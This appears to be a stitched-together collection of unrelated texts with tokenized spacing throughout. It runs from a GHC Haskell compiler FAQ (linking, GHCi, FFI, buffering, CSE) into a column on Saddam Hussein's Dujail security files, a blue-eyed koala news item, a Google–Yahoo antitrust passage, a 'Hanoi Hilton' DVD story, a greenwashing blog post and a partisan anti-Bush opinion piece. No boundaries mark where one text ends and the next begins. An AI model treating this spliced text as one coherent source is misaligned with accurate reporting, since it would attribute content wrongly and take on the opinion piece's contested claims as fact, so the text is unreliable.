Long link times have been attributed to using Sun 's linker on Solaris , as compared to GNU ld which appears to be much faster .
So if you 're on a Sun box , try switching to GNU ld .
This article from the mailing list has more information .
One huge slowdown is also working on remote filesystem , e.g. , nfs .
Work on a local machine , preferably .
You may also speed up linking by enabling dynamic linking with the - dynamic option of GHC or -- enable - executable - dynamic of Cabal .
Missing Include Files
Why do I get errors about missing include files when compiling with - O or - prof ?
Certain options , such as - O , turn on via -C compilation , instead of using the native code generator .
Include files named by -# include options or in foreign import declarations are only used in via -C compilation mode .
See Section 8.2.2.1 , ´ Finding Header files for more details .
Compiling for Profiling
How do I compile my program for profiling without overwriting the object files and hi files I 've already built ?
You can select alternative suffixes for object files and interface files , so you can have several builds of the same code coexisting in the same directory .
For example , to compile with profiling , you might do this :
ghc -- make - prof -o foo - prof - osuf p.o -hisuf p.hi Main
See Section 4.6.4 , ´ Redirecting the compilation output (s ) for more details on the - osuf and - hisuf options .
Syntax
String Gaps
I can't get string gaps to work
If you 're also using CPP , beware of the known pitfall with string gaps mentioned in Section 4.10.3.1 , CPP and string gaps .
GHCi
Error Messages
Missing Symbols
GHCi complains about missing symbols like CC_LIST when loading a previously compiled .o file .
This probably means the .o files in question were compiled for profiling ( with - prof ) .
Workaround : recompile them without profiling .
We really ought to detect this situation and give a proper error message .
Starting GHCi
When I try to start ghci ( probably one I compiled myself ) it says ghc - 5.02 : not built for interactive use
To build a working ghci , you need to build GHC 5.02 with itself ; the above message appears if you build it with 4.08.X , for example .
It 'll still work fine for batch - mode compilation , though .
Note that you really must build with exactly the same version of the compiler .
Building 5.02 with 5.00.2 , for example , may or may not give a working interactive system ; it probably wo n't , and certainly is n't supported .
Note also that you can build 5.02 with any older compiler , back to 4.08.1 , if you do n't want a working interactive system ; that 's OK , and supported .
Duplicate Definitions
I get an error message from GHCi about a " duplicate definition for symbol __module_registered "
An error message like this :
GHCi runtime linker : fatal error : I found a duplicate definition for symbol __module_registered whilst processing object file /usr / local / lib / ghc-6.2/HSfgl.o
probably indicates that when building a library for GHCi ( HSfgl .o in the above example ) , you should use the -x option to ld .
REPL Workarounds
Why does n't " x=1 " work at the ghci prompt ?
Type
let x = 1
instead .
From IRC : " But in general , it 's tricky to define function interactively .
You can do simple stuff easily enough : " let f x = x * x " or whatever ; but for anything other than a simple one - liner , I usually stick it into a file and then load it with ghci .
The Foreign Function Interface
Blocking
When do other Haskell threads get blocked by an FFI call ?
safe unsafe - threaded NO YES no - threaded YES YES
The - threaded flag ( given when linking ; see the manual ) allows other Haskell threads to run concurrently with a thread making an FFI call .
This nice behaviour does not happen for foreign calls marked as `unsafe` ( see the Foreign Function Interface description in the Haskell 2010 Language Report ) .
There used to be another modifier , threadsafe , which is now deprecated .
Use `safe` instead .
Using Floats
When I use a foreign function that takes or returns a float , it gives the wrong answer , or crashes .
You should use the -#include option to bring the correct prototype into scope ( see Section 4.10.5 , ´ Options affecting the C compiler ( if applicable ) ) .
Propagating Run-time Errors as Exceptions
How can I propagate a Haskell run-time error ( e.g. pattern match failure ) as an exception to a foreign caller of the Haskell function .
If a runtime error occurs inside a DLL compiled by ghc ( like " irrefutable pattern match failed " or exceptions caused by error ) , the application that called the DLL function dies .
This is ok for development but unacceptable when it happens with a user sitting in front of the display .
So the question is :
Is there any way to catch and process runtime errors ?
I am looking for some way to map those errors to exceptions on the C++ side that can be caught if required .
It would be ok to kill the Haskell runtime system and unload the DLL if necessary .
Answer :
The FFI does n't provide any way to propagate exceptions from Haskell to the caller of a foreign export , because there 's no standard way to do this .
It is your responsibility to catch the exception in Haskell and return an appropriate error code to the caller .
To raise a C++ exception , you would probably need another C++ wrapper around each foreign export , translating an error code into the C++ exception .
Calling C Procedures
How do I call a C procedure from a Haskell program ?
First , you 'll want to keep open the GHC user manual section on foreign function calling , and the Haskell FFI addendum .
Now , let 's assume you got this c- program ffi.c which writes THE answer to a file :
#include < stdlib.h > # include < stdio.h > write_answer ( char * userfilename ) { FILE * userfile ; userfile=fopen( userfilename , " w " ) ; fprintf ( userfile , " 42 " ) ; fclose ( userfile ) ; }
You also need a header file ffi.h .
void write_answer ( char * userfilename )
Next Step : Write the according Haskell program to include the function write_answer in your Haskell code :
{-# INCLUDE < ffi.h > #-} {-# LANGUAGE ForeignFunctionInterface #-} module Main where import Foreign import Foreign .
C.String foreign import ccall " ffi.h write_answer " cwrite_answer :: CString -> IO ( ) write_answer :: String -> IO ( ) write_answer s = do s' <- newCString s cwrite_answer s' main = write_answer " ffi.dat "
Now we get to compiling ( assume that / tmp / ffi/ is the current path ) .
cc - fPIC -c ffi.c ar rc libffi.a ffi.o ghc - lffi - L/tmp / ffi -- make Main
And the resulting executable should write the file .
The - fPIC parameter to the c compiler is not strictly necessary .
But the result will help us in the next step which is to dynamically link the library for use in GHCi .
Compiling C Programs
How do I compile my C program to use in GHCi ?
Suppose you got your c-program compiled ( with - fPIC parameter ) as described above .
If you try to load your file Main .hs in GHCi you get an error similar to this :
Loading object ( dynamic ) ffi ... failed .
Dynamic linker error message was : libffi.so : cannot open shared object file :
No such file or directory
Whilst trying to load : ( dynamic ) ffi
What you need is a shared library .
To get it you compile once more :
cc - shared -o libffi.so ffi.o
And now it all works fine :
$ ghci - lffi - L/tmp/ ffi Main.hs GHCi , version 6.8.2 : http://www.haskell.org/ghc/ :? for help Loading package base ... linking ... done .
Loading object ( dynamic ) ffi ... done final link ... done
Ok , modules loaded : Main .
Prelude Main > write_answer " test " Prelude Main > :! cat test 42 Prelude Main >
Input / Output
Strings
If I print out a string using putStr , and then attempt to read some input using hGetLine , I do n't see the output from the putStr .
The stdout handle is line - buffered by default , which means that output sent to the handle is only flushed when a newline (
) is output , the buffer is full , or hFlush is called on the Handle .
The right way to make the text appear without sending a newline is to use hFlush :
import System .IO main = do putStr " how are you today ? " h Flush stdout input <- hGetLine stdin process input
You 'll probably find that the behaviour differs when using GHCi : the hFlush is n't necessary to make the text appear .
This is because in GHCi we turn off the buffering on stdout , because this is normally what you want in an interpreter : output appears as it is generated .
If I use the above fix , but check for EOF with isEOF before prompting for user input , the above problem still happens ( GHC 6.12.1 )
Buffering on Handles
If I explicitly set the buffering on a Handle to NoBuffering I 'm not able to enter EOF by typing " Ctrl - D " .
This is a consequence of Unixy terminal semantics .
Unix does line buffering on terminals in the kernel as part of the terminal processing , unless you turn it off .
However , the Ctrl - D processing is also part of the terminal processing which gets turned off when the kernel line buffering is disabled .
So GHC tries its best to get NoBuffering semantics by turning off the kernel line buffering , but as a result you lose Ctrl - D. C'est la vie .
FIFOs ( Named Pipes )
When I open a FIFO ( named pipe ) and try to read from it , I get EOF immediately .
This is a consequence of the fact that GHC opens the FIFO in non-blocking mode .
The behaviour varies from OS to OS : on Linux and Solaris you can wait for a writer by doing an explicit threadWaitRead on the file descriptor ( gotten from Posix.handleToFd ) before the first read , but this does n't work on FreeBSD ( although rumour has it that recent versions of FreeBSD changed the behaviour to match other OSs ) .
A workaround for all systems is to open the FIFO for writing yourself , before ( or at the same time as ) opening it for reading .
Importing Functions Returning Char / Short
When I foreign import a function that returns char or short , I get garbage back .
This is a known bug in GHC versions prior to 5.02.2 .
GHC does n't mask out the more significant bits of the result .
It does n't manifest with gcc 2.95 , but apparently shows up with g++ and gcc 3.0 .
Optimization
Garbage Collection
My program spent too much time doing garbage collection
Add the " +RTS - A10 m " option to the command line when you run your program .
This sets the allocation area size used by the garbage collector to 10 M , which should sufficiently decrease GC times ( the default is 256K ; see the section " Running a compiled program " in the users ' guide ) .
You can also add to your program C module containing statement
char * ghc_rts_opts = " - A10 m " ;
to force your program to use this setting on each run .
Subexpression Elimination
Does GHC do common subexpression elimination ?
In general , GHC does not do CSE .
It 'd be a relatively easy pass for someone to add , but it can cause space leaks .
And it can replace two strictly - evaluated calls with one lazy thunk :
let { x = case e of ... ; y = case e of ... } in ... == > let { v = e ; x = case v of ... ; y = case v of ... } in ...
Now v is allocated as a thunk .
( Of course , that might be well worth it if e is an expensive expression . )
Instead GHC does " opportunistic CSE " .
If you have
let x = e in .... let y = e in ....
then it'll discard the duplicate binding .
This can still cause space leaks but it guarantees never to create a new thunk , and it turns out to be very useful in practice .
Bottom line : if you care about sharing , do it yourself using let or where .
Laziness
When can I rely on full laziness ?
Consider this program
f x y = let r = expensive x in r + y g vs = map ( f 2 ) vs
Since r depends only on x , you might hope that ( expensive 2 ) is computed just once .
And that is indeed what will happen if you write
f_opt x = let r = expensive x in \ y -> r + y g_opt vs = map ( f_opt 2 ) vs
It 's easy enough for a compiler to transform f into f_opt .
( This is called the " full laziness " transformation . )
BUT in the cases when f is fully - applied , f_opt is * less * efficient than f ; consider
h ys zs = zipWith f_opt ys zs
Reason : it 's much less efficient to have separate lambdas \x -> let ... in \y -> e than one compound lambda \xy -> e .
So the best way to transform f depends on how it is used .
When it 's used locally and just once , GHC inlines it at the call site and all is good .
But when it 's exported or called many times , GHC 's full laziness transformation uses the following rule : never " float " a let between two lambdas .
So it wo n't transform f into f_opt .
On the other hand , if you write f_opt , GHC will keep it that way .
Furthermore , if a sub-expression can be floated right out of a complete lambda group , GHC will float it out .
For example
f x vs = map ( \ y -> y + expensive x ) vs
Here , the ( expensive x ) can be floated out of the \x - >... lambda without separating two lambdas , and the full laziness transfom will do just that .
Miscellaneous
Upgrading GHC
Do I have to recompile all my code if I upgrade GHC ?
Yes .
There are two reasons for this :
GHC does a lot of cross - module optimisation , so compiled code will include parts of the libraries it was compiled against ( including the Prelude ) , so will be deeply tied to the actual version of those libraries it was compiled against .
When you upgrade GHC , the libraries may change ; even if the external interface of the libraries does n't change , sometimes internal details may change because GHC optimised the code in the library differently .
We sometimes change the ABI ( application binary interface ) between versions of GHC .
Code compiled with one version of GHC is not necessarily compatible with code compiled by a different version , even if you arrange to keep the same libraries .
Shared Libraries
Why does n't GHC use shared libraries ?
GHC does provide shared libraries , currently only on MacOS X .
We are working on making shared libraries work on other platforms .
However , GHC - compiled libraries are very tightly coupled , which means it 's unlikely you'd be able to swap out a shared library for a newer version unless it was compiled with exactly the same compiler and set of libraries as the old version .
Debugging
My program is failing with head [ ] , or an array bounds error , or some other random error , and I have no idea how to find the bug .
Can you help ?
Try the GHCi Debugger , in particular look at the section on " Debugging Exceptions " .
Alternatively , compile your program with - prof - auto - all ( make sure you have the profiling libraries installed ) , and run it with +RTS - xc - RTS to get a ´stack trace at the point at which the exception was raised .
See Section 4.14.4 , ´RTS options for hackers , debuggers , and over - interested souls for more details .
Increasing Heap Size
How do I increase the heap size permanently for a given binary ?
See Section 4.14.5 , ´´Hooks to change RTS behaviour .
Compiling for Parallel Execution
I 'm trying to compile my program for parallel execution with the - parallel , and GHC complains with an error like ' failed to load interface file for Prelude ' .
GHC does n't ship with support for parallel execution ; that support is provided separately by the GPH project .
Using Unsafe Functions
unsafePerformIO ?
When is it safe to use unsafe functions such as
We 'll give two answers to this question , each of which may be helpful .
These criteria are not rigorous in any real sense ( you 'd need a formal semantics for Haskell in order to give a proper answer to this question ) , but should give you a feel for the kind of things you can and cannot do with unsafePerformIO .
It is safe to implement a function or API using unsafePerformIO if you could imagine also implementing the same function or API in Haskell without using unsafePerformIO ( forget about efficiency , just consider the semantics ) .
In pure Haskell , the value of a function depends only on the values of its arguments ( and free variables , if it has any ) .
If you can implement the function using unsafePerformIO and still retain this invariant , then you 're probably using unsafePerformIO in a safe way .
Note that you need only consider the observable values of the arguments and result .
For more information , see this thread .
Using Finalizers
I can't get finalizers to work properly .
My program sometimes just prints < < loop > > .
Chances are that your program is trying to write a message to stdout or stderr in the finalizer .
Handles have finalizers themselves , and since finalizers do n't keep other finalized values alive , the stdout and stderr Handles may be finalized before your finalizer runs .
If this happens , your finalizer will block on the handle , and probably end up receiving a NonTermination exception ( which is printed as < < loop > > ) .
Extensible Records
Does GHC implement any kind of extensible records ?
No , extensible records are not implemented in GHC .
Hugs implements TRex , one extensible record variant .
The problem is that the record design space is large , and seems to lack local optima .
And all reasonable variants break backward compatibility .
As a result , nothing much happens .
Using Extra GCC / Linker Options
How can I make GHC always use some extra gcc or linker option ?
If you want to * always * use an extra option then you can edit the package configuration for the 'rts ' or ' base ' package since these packages are used by every program that you compile with GHC .
You might want to do this if you had installed something that ghc needs but into a non-standard directory , thus requiring special compilation or linking options .
All you need to do is to dump out the configuration into a human readable form , edit it and re-register the modified package configuration .
The exact commands to do that are below , but first here are the fields in the file that you might want to modify :
include - dirs directories to search for .h files library - dirs directories to search for libraries extra-libraries extra C libs to link with cc-options extra flags to pass to gcc when compiling C code or assembly ld-options extra flags to pass to gcc when linking
to edit the rts package ( or base ) confiuration just do :
ghc-pkg describe rts > rts.package.conf edit rts.package.conf with your favourite text editor ghc-pkg update rts.package.conf
On Unix systems and Windows , some options can also be set with environment variables such as LIBRARY_PATH and C_INCLUDE_PATH .
Editor ’s note :
This article was originally posted at The Independent .
All kinds of horrors flop on to my Beirut doormat .
There ’s
The Independent ’s mobile phone bill , a slew of blood - soaked local Lebanese newspapers — “ Saleh Aridi ’s blood consolidates [ Druze ] reconciliation ” , was among the goriest of the past few days — and then there are files from the dark memory lane through which all Middle East history has to pass .
The repulsive Baath party archives of Saddam Hussein are the latest to find a place on my coffee table , all marked “ Secret ” , unpublished — though they formed the basis for the old man ’s trial and for his depraved hanging by the Iraqi government more than two years ago .
I reprint them now without excuse , for they have a bitter taste in the “ new ” Iraq and in the “ new ” Afghanistan about which we still fantasise as we send more Nato troops into Asia ’s greatest military graveyard .
The documentary evidence of Saddam ’s brutal inquiry into the killings at the Shia Muslim village of Dujail in 1982 provides frightening , fearful testament to the earnestness and cruelty of totalitarianism , the original files of Saddam ’s mukhabarat security services in their hunt for the men who tried to assassinate the Iraqi dictator more than a quarter of a century ago .
Saddam was then the all - powerful leader of a nation at war with Iran — an eight - year conflict that would cost the lives of more than a million Muslims on both sides — and whose most ruthless enemies were members of the Iranian - supported Al - Dawa Party ( including a certain Nouri al - Maliki ) .
Saddam ’s closest allies at this time were the Gulf oil sheikhdoms — and the United States , which was sending military supplies , chemical precursors and satellite reconnaissance photographs to Baghdad to assist Saddam in his war against Iran , a nation he had invaded two years earlier .
On his passage through Dujail , Saddam ’s heavily armed convoy was attacked by 10 villagers armed with Kalashnikov rifles .
All were killed at the time or hunted down and murdered later .
In their subsequent investigations , however , the mukhabarat — in this case operating under the ominous title of the “ Regime Crimes Liaison office ” — were able to use the system of tribe and sub - tribe in Dujail to tease out the names of everyone associated with the attackers .
The patriarchal lineage — wherein all males carry their father ’s , grandfather ’s , and great - grandfather ’s names , sometimes back eight generations — enabled the secret police to trace the male line of entire families and thus to liquidate them all .
Their womenfolk were tortured , many of them raped .
The men were butchered .
One grandfather lost all his sons and grandsons .
His “ treacherous ” family line came to an end .
The ruthlessness of Saddam ’s “ Crimes Liaison Office ” comes across in their surviving reports .
We were assigned by the party to submit the names of the opposing and malignant members of the treacherous Al - Dawa Party …
A comrade ’s greeting .
Dun Shakir to the Comrade Member of the State Command .
Subject / Security report :
Through the fact that the criminals from Al - Dawa Party have attacked our Great Commander the Secretariat of the State , the Striving Comrade Saddam Hussein , we raise the names of the hostile families that are against the party and revolution , knowing that we already raised several reports and surveys on these criminals whose names are below . ”
And there follows a sheaf of files listing the accused families and their menfolk .
Of the Al - Tayyar sub - tribe of the Abu Haideri tribe of Dujail , for example , there is a great grandfather called Abdullah with three children — Asad , Mohammed and Suheil — who themselves have nine children — Sabri , Ali , Nayif , Jasim , Hassan , Qadir , Kabsun , Yasin and Hani .
Saddam ’s secret police fell upon their sons : Ammar , Abdel Salam , Qasim , Sahib , Sa’ad , another Qasim ( son of Qadir ) , Hashim , Ali , a second Ali ( son of Yassin ) and Thamir .
All of the latter were executed on Saddam ’s orders .
So was another of Jasim ’s other sons — Nabil — and four more of Hassan ’s sons — Hussein ( who was indeed involved in the assassination attempt on Saddam ) and Fatih and Salim and Mohammed and Mahmoud .
Five more of their first cousins —
Ahmed , Abdullah , Mohammed , Mahmoud and Abbas — were also done to death .
Thus only one male issue of great - grandfather Abdullah ’s entire family escaped Saddam ’s execution squads .
But these were just the male children of one family .
Saddam ’s murderers were after many more .
The investigators at Saddam ’s trial noticed one telling trait among his secret police officers .
If they were reporting an execution , they would scribble their signature .
If they were sending intelligence information , they would sign their names in full .
After the fall of Saddam , of course , it was not difficult to match up the full names with the scribbled signatures .
But now I ask a question .
When US troops massacre Iraqi civilians in Haditha because their buddy has been murdered , what is the difference between their revenge and that of Saddam ?
When a Taliban attack on Nato forces in Afghanistan provokes a US air strike on a village and leaves women and children torn to pieces in the ruins — this now seems the inevitable result — what is the difference between those innocent deaths and the destruction of the families of Abdullah ’s grandchildren in Dujail ?
Yes , I know that Saddam ’s thugs selected the relatives of his enemies and we merely kill anyone in the area of our enemies .
And yes , I grant you the outcome is not the same .
The Iraqi dictator was hanged in Baghdad in 2006 , cursed by his hooded Shia “ Al - Dawa ” executioners as he stood on the scaffold .
For us , there will be no hangings .
He may have been christened “ Logan ” , but as soon as Dreamworld ’s superstar emerged from his mum ’s pouch and took a first glimpse of the world late in late 2007 , he was dubbed “ Frank ” for his extraordinary blue eyes .
He ’s a little puff of fur with intense blue eyes , kind of like a Mel Gibson with a bit more fluff .
Or Sinatra without the croon , ” said Dreamworld ’s Life Sciences Supervisor , Michelle Barnes .
" I have worked with koalas for 14 years and have never seen a blue eyed one before . ”
Australian Koala Foundation ’s ( AKF ) CEO , Deborah Tabart was also at a loss to explain the unusual eye colouring .
“ In the 20 year history of the AKF , this is the first we have heard of a blue - eyed koala in captivity .
It certainly appears to be a once in a lifetime event . ”
Ms Barnes said that medically speaking there is nothing wrong with Australia ’s newest heart throb , apart from a case of reduced pigmentation .
His mother also has the same condition , although her eyes are brown .
Frank wo n't be treated any differently to any of the 57 koalas at Dreamworld ’s Australian Wildlife Experience , said Ms Barnes .
“ He is part of Dreamworld ’s koala collection and whether he has blue or pink eyes he will be treated and managed like the rest of the koala family .
We are delighted that he ’s a little unusual , but he will only be used as a poster boy to help draw attention to the plight of this beautiful and iconic animal . ”
Ms Barnes added that Frank is a typical mumma ’s boy who sleeps 18 hours a day .
“ He is still drinking from mum's pouch and is at a semi independent stage where he ’s testing new foods .
His favourite food these days is the leaf of the blue gum . ”
Koalas are around 12 - 15 mm when born and it ’s not until six months of age and around 12 cm that they begin to emerge from the pouch and open their eyes .
Like humans , many have a blue tinge to their eyes , which quickly recedes .
Frank ’s eyes were considerably lighter and he was taken to a veterinary eye specialist for appropriate testing in December .
“ His vision is perfect and that and his health is what is most important to us . ”
Frankie is currently in a special koala crèche and will go on display with the other koalas in April , around his first birthday .
About the Koala
Koalas are native to Australia and found in the wild in Queensland , New South Wales , Victoria and South Australia .
Koalas ’ eyes are relatively small in relation to the size of their other sensory features , such as their ears and nose , and their eyesight is not particularly highly developed .
Koalas rely on a highly developed hearing and sense of smell to differentiate between types of eucalyptus leaves and to detect the scent warnings put on trees by other koalas .
About Koala Handling Regulations
The EPA ( Environmental Protection Authority ) has developed a code of practice in conjunction with the QLD Zoological industry to regulate handling of koalas for photographic opportunities to a maximum 30 minutes a day and 180 minutes per week .
Frankie is currently enjoying time in a koala crèche and will undergo handling procedures before he can meet with the public .

That is a fear many in the industry had expressed for months .
“ Despite the careful construction , the deal does not pass the smell test of the No. 1 and No. 2 search players working directly together , ” said Jonathan Miller , the former chief executive of AOL .
In 2005 , Mr. Miller helped negotiate a search and advertising partnership between AOL and Google .
Mr. Barnett said the decision to abandon the Google - Yahoo deal eliminated the need for government intervention , suggesting that in their investigation , regulators had not found cause for further action against Google .
Still , the Justice Department ’s threat to block the deal , legal experts say , was a departure as well as a sign that Google would receive increasingly close scrutiny in the future .
Under Mr. Barnett , antitrust enforcement in the Bush administration has been done with a light hand .
Merger deals , for example , have typically been given a green light .
And as Google pointed out , its planned tie - up with Yahoo was much less than a merger  a commercial contract for Google to handle some of Yahoo ’s search advertising .
Yet officials took a long , hard look at the agreement and found it troublesome .
“ For all we say about how fast these high - tech markets change , the really big players 
Google in Internet search ads , Microsoft in personal computer software , Intel in microchips  do seem to stay big , ” said Herbert J. Hovenkamp , a law professor at the University of Iowa .
“ A market in which Google and Yahoo compete against each other in Internet search advertising looked a lot better to Justice than one in which they cooperate .
That ’s got to be the subtext here . ”
It is not clear how the Justice Department under a new administration would view Google ’s growing power .
Democrats generally take a more aggressive stance than Republicans on antitrust issues .
But the incoming administration may not be inclined to go after Google , whose chief executive , Eric E. Schmidt , campaigned for Senator Obama .
As Google has extended its power into every corner of the Internet and beyond , a clash with regulators was inevitable .
And some analysts said Google actually calculated the risk of such a confrontation before it offered the ad partnership to Yahoo .
Warner Home Video has plans to release a 20th anniversary edition of the feature film " Hanoi Hilton " on Veteran 's Day , November 11th , but has forbidden the film 's director from screening either the film or a " bonus feature " interview he conducted with presidential candidate John McCain until after Election Day , Jeffrey Ressner reports from Los Angeles :
According to the film 's writer - director Lionel Chetwynd , a longtime Hollywood figure and one of the elder statesmen of the small but tightly knit conservative community there , he received a letter recently from a Warner 's publicist in response to a request he made to screen the video for friends and associates .
Not only was he informed that there was no publicity budget for the re-release , but he was told in no uncertain words that showing either the film or the McCain footage was " prohibited . "
Since last week , Chetwynd and his attorney have been trying to get to the bottom of the situation , to no avail .
Chetwynd was reportedly told that the studio did n't want to affect the election in any way , which seems a bit far - fetched considering the impact a bonus feature might have on a national presidential election .
The film is a fictional retelling about American POWs held at the infamous North Vietnamese prison where McCain and others were kept during the war , and features a number of composite characters based on real - life prisoners Chetwynd interviewed .
The writer - director had spoken with McCain before making the film , and recently interviewed him in late May for the upcoming DVD .
According to one person who has seen the edited bonus footage , McCain does n't say anything that could be considered " groundbreaking " or " controversial . "
In a recent Businessweek article , Kim Jeffery the CEO of Nestlé Water North America , makers of Poland Spring waters , whines ( yes , whines ) that they are misunderstood and not given the credit they deserve .
Clearly he thinks all the charges of greenwash are unfair .
But , are they ?
The article tells of all the environmentally preferable things that they had done but that no one knew about .
The article then goes on to say :
Part of the reason Nestlé Waters was n’t touting its environmental efforts , according to Jeffery , was that he and the rest of management considered such actions business as usual .
Yes !
That ’s the point .
the “ green ” things Nestlé were doing were part of normal business operations , many of which saved the company lots of money .
Are they good for the environment ?
Of course .
But that ’s not really what greenwashing is all about .
Its about consumer marketing .
This is where the real greenwashing occurs .
Before I go on , I want to say that I truly applaud the industry for implementing eco-bottles .
That said , it seems to be a blatant case of greenwash to position bottled water as being good for the environment .
Water companies should tout eco-bottles , but they should n’t suggest that they are good for the environment .
They should sell the water , not the the environmental friendliness of the packaging .
I would like to ad , that Nestlé is not the worst offender of greenwashy bottled water ads and their ad campaigns are far less offensive than those for Fuji Water and Deer Park .
Nonetheless , these types of ads violate two classic greenwash tactics , as defined by Greenpeace ’s Greenwash Criteria :
1 ) Dirty Business -
These ads tout bottled water as a source of environmental reduction !
Yet , we all know that the core business is inherently polluting and unsustainable .
and
2) Ad Bluster – These ads and PR campaigns exaggerate and misrepresent an environmental achievement in order to divert attention away from environmental problems of bottled water .
There is nothing about bottled water , other than eliminating the product category , that will truly reduce the impact on the environment .
Or as thecynic of Winnipeg put it nicely on the blog greenwashingindex.com :
Several Nestlé bottled water brands , including Poland Spring , advertised their new ecobottles .
The bottles have 30 % less plastic , and can be recycled ( that not any different , they could always be recycled , but why not mention that anyway ) .
they ignore the fact that many still end up in the landfill , or worse on the side of the highway .
Anyway , it ’s still 70 % of the plastic that takes energy to produce and then kicks around in a landfill for 500 years .
The point is that businesses and marketing folks need to be honest about what they are selling .
The charges of greenwashing wo n’t go away until bottled water companies change their advertising and PR campaigns .
When they make an eco-advancement they should shout about it .
But they should not use it to misrepresent , mislead or divert .
As consumers who care about real environmental impact reduction , we need to resist this type of advertising because , as aptly put by Business Ethics , greenwash diminishes the value of legitimate corporate environmental successes and ultimately results in consumer and regulatory complacency .
And that ai n’t good .

Whoever is elected president in the coming November 4 American election will inherit a most miserable situation on nearly all fronts .
This is because George W. Bush has been one of the worst presidents the U.S. has ever had , if not the worst .
It is widely recognized that he was a below average politician who led his country on the wrong track , both domestically and internationally .
Today , only a meager 9 percent of Americans dare to say that their country is moving in the right direction .
As a matter of fact , a very large majority of Americans — both Democrats and Republicans , men and women , residents of cities and of rural areas , high school graduates and college - educated — all say that the United States has been headed in the wrong direction under George W. Bush ’s stewardship .
Bush ’s approval rating reflects the lack of confidence that Americans have in him and his administration .
In fact , George W. Bush has recorded the lowest approval rating of any president in the 70 - year history of the Gallup Poll .
And , around the world , the United States has never had a leader who commands so little respect and confidence .
Most people in the U.S. and abroad will find satisfaction in seeing his term come to an end .
This is a terrible indictment of the Bush Administration that has presided over America ’s destinies for the last eight years .
What is more disconcerting , this all came after George W. Bush won the presidential election in 2000 , with fewer popular votes than Democratic candidate Al Gore , after a one - judge - majority decision of the Supreme Court , in effect , gave him the presidency .
Therefore , this is an administration that had no widespread democratic mandate to do what it has done .
And it has done a lot of things wrong .
In fact , many people think this has been a morally bankrupt administration .
International disaster : An Illegal and Immoral War of Aggression
At the center of this fiasco , is the fact that the Bush - Cheney administration and its neocon cohort rushed to exploit the 9/11 terrorist attacks and used this as a pretext to implement a preconceived pro-Israel and pro-oil plan in the Middle East .
This led them to adopt a simplistic response to Islamist terrorism , barging into complex Middle East societies on elephant feet .
But in the process , they have only succeeded in making matters worse and in encouraging more hatred against the U.S. and more terrorism .
Indeed , George W. Bush will be remembered above all as the man who launched an illegal and immoral war of aggression against another sovereign nation , on false pretenses and forged documents , destroying in so doing the entire country of Iraq , and damaging perhaps irreparably the U.S. reputation in the world .
As Scott McClellan , Bush ’s former Press Secretary during seven long years , stated , Bush and his advisers [ in launching the Iraq War ] “ confused the propaganda campaign with the high level of candour and honesty so fundamentally needed to build and then sustain public support during a time of war ” .
Bush ’s deception and lies about Iraq in order to initiate a war of aggression , an aggression that is a war crime under the Nuremberg standard established by the U.S. , are well documented .
Thus , historians will have no difficulty in establishing the fact that the United States , under Bush , acted as a lawless international aggressor .
In initiating a war of aggression , Bush did violate the United Nations Charter , which “ prohibits the use of military force ” against any nation without the specific approval of the United Nations Security Council .
The Security Council never approved the American - led military invasion of Iraq .
Therefore , Bush and his crew had no international legal basis to invade Iraq .
And they cannot pretend that Congress gave them such an authorization , since it is well known in law that no domestic law can override a signed international treaty in good standing .
In a domestic parallel , George W. Bush and his administration have set up what is probably the most widespread war profiteering system in modern history , through which billions and billions of dollars were misappropriated and wasted .
At the same time as they were adopting a permanent war posture abroad , they were irresponsibly calling at home for a 674 billion dollar tax cut for their rich supporters and pushing up the deficits , of which a large proportion was financed by borrowing abroad .
Illegality and Immorality
On the legal front , this is an administration that has shamed the United States with its illegal actions , with its deliberate and dishonest lies , with its war crimes , its disregard for international treaties , and with its overt disregard of constitutional government .
On the question of lawlessness , the list of missteps the Bush - Cheney administration took outside of the law is too long for a short article as this one .
But there are numerous documents to be consulted and it is possible to attempt a short summary .
From the very beginning , the Bush - Cheney administration has dismissed international law and disregarded domestic law .
They began by either repudiating or refusing to honor the United States ’ international commitments and obligations , thus showing indifference , if not outright hostility , toward international law .
They opted out of five important international treaties and commitments : the Kyoto Protocol on Climate Change , the Anti-Ballistic Missile Treaty , the Biological and Toxin Weapons Convention , the Non-Proliferation of Nuclear Weapons Treaty and the International Criminal Court .
In so doing , the United States , under the Bush - Cheney administration , has betrayed its international commitments and has moved away from being a moral state , and more and more toward the status of an international rogue state .
This was all confirmed when the Bush - Cheney administration adopted , in September 2002 , the Bush Doctrine of preventive war , an internationally illegal and immoral program .
Indeed , under existing international law , no country may attack another under false pretenses , nor use military force unilaterally .
This was followed by the even more dangerous and hairy Cheney Doctrine ( or the One Percent Doctrine ) which is anti-human rights , anti-rule of law and anti-Constitution , because it posits that if there is even a 1 % chance American interests are in jeopardy somewhere in the world , unilateral American military interventions are justified , and this without conclusive evidence or extensive analysis .
Such hubristic and shoot - from - the - hip foreign policies are a true recipe for international anarchy and thus render a great disservice to humanity .
Domestically , President George W. Bush has introduced the unconstitutional practice of adding signing statements to new laws , stating that he has the right , as President , to violate any section of a law , should he deem it in the national interest to do so .
For example , on January 28 , 2008 , Bush signed into law the repeal of the “ Insurrection Act Rider ” in the 2006 defense appropriations bill .
That rider had given the President sweeping power to use military troops in ways contrary to the Insurrection Act and Posse Comitatus Act and authorized the president to have troops patrol American streets in response to disasters , epidemics , and any “ condition ” he might cite .
But in signing this repeal , Bush attached a signing statement that he did not feel bound by the repeal , thus opening the possibility he could ignore the law any time he saw fit to do so .
Disrespect for Liberty and the U.S. Constitution
As if this were not enough , there was the attempt by the Bush - Cheney regime to suspend and even permanently abolish the more than eight centuries old right of Habeas Corpus .
And when the Supreme Court , in a far - reaching decision on June 12 , 2008 , rebuked the B - C administration ’s argument that it had a right to establish concentration camps on U.S. - run properties around the world and hold prisoners indefinitely with no legal recourse , especially at the Guantánamo Bay detention center , President George W. Bush had the gall to criticize the Supreme Court ’s decision while on a trip to Europe .
Then Bush embarked upon a program of domestic spying on Americans never before seen in a democracy .
He , indeed , removed most of the safeguards that had been erected to protect citizens from illegal and warrantless spying activities by government , thus making a mockery of the U.S. Constitution .
In particular , the Bush - Cheney administration did not respect key parts of the U.S. Constitution , especially the Fourth Amendment , which protects against unreasonable searches and seizures .
It must said , however , that some Bush Democrats , such as House Speaker Nancy Pelosi ( D - CA ) and Democratic House Majority Leader Steny H. Hoyer ( D – MD ) have also willfully and enthusiastically collaborated with George W. Bush in enlarging the government ’s spying powers over citizens .
On his own , however , George W. Bush did his utmost to make permanent the President ’s War Powers , thus making sure that the United States could remain on a permanent war path and be in a position to suspend at will basic constitutional rights .
On top of everything , George W. Bush will be remembered as a politician who authorized torture and indefinite detention of prisoners .
